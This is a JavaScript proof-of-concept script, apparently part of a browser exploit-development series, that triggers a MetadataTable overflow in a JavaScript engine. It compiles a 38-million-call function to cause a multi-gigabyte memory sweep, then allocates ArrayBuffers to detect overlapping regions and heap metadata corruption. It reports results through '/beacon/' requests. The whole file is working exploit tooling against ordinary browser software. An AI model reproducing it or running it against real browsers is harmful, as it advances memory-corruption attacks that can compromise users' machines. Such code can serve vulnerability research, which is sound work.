// p316 - MetadataTable overflow: detect heap metadata corruption
//
// Instead of spraying before and reading after, compile first
// (4.3GB sweep corrupts whatever is mapped forward), then allocate
// many buffers and check for overlapping memory (heap metadata corruption).
//
// Strategy:
// 1. Compile 38M function (MetadataTable overflow, 4.3GB sweep)
// 2. Allocate many buffers of various sizes
// 3. Fill each with a unique pattern (buffer index)
// 4. Check if any buffer contains another buffer's pattern (overlap)
//
// If the sweep corrupted marge bitfit page headers or allocation
// bitmaps, the allocator might hand out overlapping regions.
//
// Beacon prefix: V316-

(function() {
  function B(tag, body) {
    try {
      var u = '/beacon/V316-' + tag + '?t=' + Date.now();
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch (e) {
      try { new Image().src = '/beacon/V316-' + tag; } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  // Phase 1: Compile the 38M function
  var N = 38348816;
  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(nChunks + 3);
  parts[0] = 'window.__p316fn=function(a){';
  for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
  parts[nChunks + 1] = 'a();'.repeat(rem);
  parts[nChunks + 2] = '};window.__p316check();';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  var blobMB = Math.round(blob.size / 1048576);
  parts = null;
  B('BLOB-' + blobMB + 'MB');

  window.__p316check = function() {
    B('COMPILED-OK');
    doCheck();
  };

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  document.head.appendChild(sc);
  sc.src = url;

  setTimeout(function() {
    if (!window.__p316fn) B('TIMEOUT-NO-COMPILE');
  }, 45000);

  function doCheck() {
    // Phase 2: Allocate buffers of various sizes in marge tier
    // Sweep may have corrupted bitfit metadata
    var SIZES = [100112, 131072, 200000, 262144, 100112, 150000];
    var COUNT = 100;
    var bufs = [];
    var views = [];
    var tags = [];

    for (var i = 0; i < COUNT; i++) {
      var sz = SIZES[i % SIZES.length];
      try {
        var ab = new ArrayBuffer(sz);
        var v = new Uint32Array(ab);
        // Fill with unique tag: buffer index repeated
        var tag = (i + 1) * 0x01010101;
        for (var j = 0; j < v.length; j++) v[j] = tag;
        bufs.push(ab);
        views.push(v);
        tags.push(tag);
      } catch (e) {
        B('ALLOC-ERR-' + i + '-' + e.message.substring(0, 30));
        break;
      }
    }
    B('ALLOC-' + bufs.length);

    // Phase 3: Check for cross-contamination
    var overlaps = 0;
    var leaks = [];

    for (var i = 0; i < views.length; i++) {
      var v = views[i];
      var expected = tags[i];

      // Check first 100 uint32 values
      var wrongCount = 0;
      var wrongVal = 0;
      for (var j = 0; j < Math.min(100, v.length); j++) {
        if (v[j] !== expected) {
          wrongCount++;
          if (wrongVal === 0) wrongVal = v[j];
        }
      }

      if (wrongCount > 0) {
        overlaps++;
        // Figure out whose tag is in our buffer
        var otherIdx = -1;
        for (var k = 0; k < tags.length; k++) {
          if (tags[k] === wrongVal) { otherIdx = k; break; }
        }
        if (leaks.length < 10) {
          leaks.push('B' + i + '-W' + wrongCount + '-V' + wrongVal.toString(16) + '-O' + otherIdx);
        }
      }
    }

    B('RESULT-overlaps' + overlaps + '-of' + views.length);

    for (var i = 0; i < leaks.length; i++) {
      B('OVERLAP-' + leaks[i]);
    }

    // Phase 4: Also scan for sweep residue in the new buffers
    // fastCalloc zeros them, but if heap metadata is corrupted,
    // the returned pointer might point to already-written memory
    var sweepHits = 0;
    for (var i = 0; i < views.length; i++) {
      var v = new Uint8Array(bufs[i]);
      // Check stride-112 positions for 0xFFFFFFFF (m_slowPathCount)
      for (var off = 12; off + 4 <= v.length; off += 112) {
        var val = u32(v, off);
        if (val !== (tags[i] & 0xFF) * 0x01010101 && val !== 0 && val === 0xFFFFFFFF) {
          sweepHits++;
          if (sweepHits <= 5) {
            B('SWEEP-B' + i + '-O' + off + '-' + hex8(v, off + 12));
          }
          break;
        }
      }
    }
    B('SWEEPHITS-' + sweepHits);

    B('DONE');
  }
})();
